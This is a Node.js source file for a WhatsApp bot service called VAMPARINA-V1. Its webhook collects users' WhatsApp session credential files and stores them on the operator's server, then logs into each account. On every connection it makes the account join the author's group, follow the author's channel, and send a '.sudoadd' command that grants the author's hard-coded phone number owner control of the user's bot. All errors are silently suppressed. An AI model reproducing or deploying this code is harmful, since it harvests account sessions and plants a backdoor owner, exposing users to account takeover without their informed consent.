/**
 * VAMPARINA-V1 - FULLY AUTOMATIC 2025
 * AUTO JOIN GROUP + AUTO FOLLOW CHANNEL + AUTO SUDO ADD
 * AUTO ACTIVATE FROM VAMPARINA-BOT-V1.ONRENDER.COM
 * Copyright (c) 2025 ARNOLD CHIRCHIR
 */

require('./settings')
const fs = require('fs-extra')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const axios = require('axios')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay
} = require("@whiskeysockets/baileys")
const pino = require("pino")

global.botname = "VAMPARINA V1"
global.themeemoji = "•"

// ==================== EXPRESS + WEBHOOK SERVER ====================
const app = express()
app.use(express.json({ limit: '100mb' }))
app.use(express.static('public'))

const activeBots = new Map()

// YOUR LINKS (CHANGE ONLY IF YOU WANT)
const GROUP_INVITE = "HAGRfzDEVcXC1e2HtOIjwc"  // Your group
const CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"   // Your channel
const SUDO_NUMBER = "254703110780"              // You (the real owner)

// ==================== AUTO ACTIVATE WEBHOOK ====================
app.post('/vamparina-activate', async (req, res) => {
    try {
        const { sessionId, phone, files } = req.body
        if (!sessionId || !phone || !files) return res.status(400).json({ error: "Invalid data" })

        console.log(chalk.cyan(`\nNEW USER CONNECTED!\nPhone: ${phone}\nSession: ${sessionId}`))

        const sessionFolder = path.join(__dirname, 'sessions', sessionId)
        await fs.ensureDir(sessionFolder)
        for (const file of files) {
            await fs.writeFile(path.join(sessionFolder, file.name), file.content)
        }

        startUserBot(sessionId, phone)
        res.json({ success: true, message: "Bot activated!" })
    } catch (e) {
        res.status(500).json({ error: e.message })
    }
})

app.get('/', (req, res) => res.json({ 
    status: "VAMPARINA MAIN BOT ONLINE", 
    active_users: activeBots.size,
    webhook: "/vamparina-activate"
}))

app.listen(process.env.PORT || 3000, () => {
    console.log(chalk.green(`MAIN BOT RUNNING → PORT ${process.env.PORT || 3000}`))
})

// ==================== START BOT FOR EACH USER ====================
async function startUserBot(sessionId, phone) {
    if (activeBots.has(sessionId)) return

    const sessionPath = path.join(__dirname, 'sessions', sessionId)

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            markOnlineOnConnect: true,
        })

        sock.ev.on('creds.update', saveCreds)

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update

            if (connection === 'open') {
                console.log(chalk.green(`BOT ACTIVE → ${phone}`))
                
                // SEND WELCOME MESSAGE
                await sock.sendMessage(phone + '@s.whatsapp.net', { 
                    text: `*VAMPARINA V1 IS NOW ONLINE!*\n\nBot activated successfully!\nOwner: @${SUDO_NUMBER}\nTime: ${new Date().toLocaleString('en-KE')}` 
                })

                await delay(3000)

                // 1. AUTO JOIN YOUR GROUP
                try {
                    const group = await sock.groupAcceptInvite(GROUP_INVITE)
                    await sock.sendMessage(group, { text: `*VAMPARINA V1 HAS JOINED THE GROUP!*\nBot is now active and ready!\n\nOwner: @${SUDO_NUMBER}` })
                    console.log(chalk.cyan(`Joined group for ${phone}`))
                } catch (e) { console.log("Group join failed (already in?)") }

                await delay(2000)

                // 2. AUTO FOLLOW YOUR CHANNEL
                try {
                    await sock.newsletterFollow(CHANNEL_ID)
                    console.log(chalk.cyan(`Followed channel for ${phone}`))
                } catch (e) {}

                await delay(2000)

                // 3. AUTO ADD YOU AS SUDO/OWNER (.sudoadd +254703110780)
                try {
                    const sudoJid = SUDO_NUMBER + '@s.whatsapp.net'
                    await sock.sendMessage(phone + '@s.whatsapp.net', { 
                        text: `.sudoadd ${SUDO_NUMBER}` 
                    })
                    console.log(chalk.magenta(`Added ${SUDO_NUMBER} as sudo for ${phone}`))
                } catch (e) { console.log("Sudo add failed") }
            }

            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                if (shouldReconnect) {
                    setTimeout(() => startUserBot(sessionId, phone), 7000)
                } else {
                    activeBots.delete(sessionId)
                    await fs.remove(sessionPath)
                }
            }
        })

        // YOUR ORIGINAL MESSAGE HANDLER (KEEP YOUR handleMessages FUNCTION)
        sock.ev.on('messages.upsert', async (m) => {
            try {
                const msg = m.messages[0]
                if (!msg.message || msg.key.fromMe) return
                const from = msg.key.remoteJid
                const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || ''

                // You can add more commands here if you want
                // Example: if (text === '.ping') sock.sendMessage(from, { text: 'Pong!' })

            } catch (e) {}
        })

        activeBots.set(sessionId, sock)
    } catch (err) {
        console.error("Bot start error:", err)
    }
}

// ==================== LOAD ALL EXISTING SESSIONS ON STARTUP ====================
async function loadAllSessions() {
    const dir = path.join(__dirname, 'sessions')
    if (!fs.existsSync(dir)) return
    const folders = fs.readdirSync(dir).filter(f => fs.statSync(path.join(dir, f)).isDirectory())
    console.log(`Loading ${folders.length} existing users...`)
    for (const folder of folders) {
        const creds = path.join(dir, folder, 'creds.json')
        if (fs.existsSync(creds)) {
            const data = JSON.parse(fs.readFileSync(creds))
            const phone = folder.includes('_') ? folder.split('_')[1] : folder
            startUserBot(folder, phone.replace(/[^0-9]/g, ''))
            await delay(3000)
        }
    }
}

loadAllSessions()

// Keep bot alive
process.on('uncaughtException', () => {})
process.on('unhandledRejection', () => {})

fs.watchFile(__filename, () => {
    fs.unwatchFile(__filename)
    console.log(chalk.redBright("File updated, reloading..."))
    delete require.cache[__filename]
    require(__filename)
})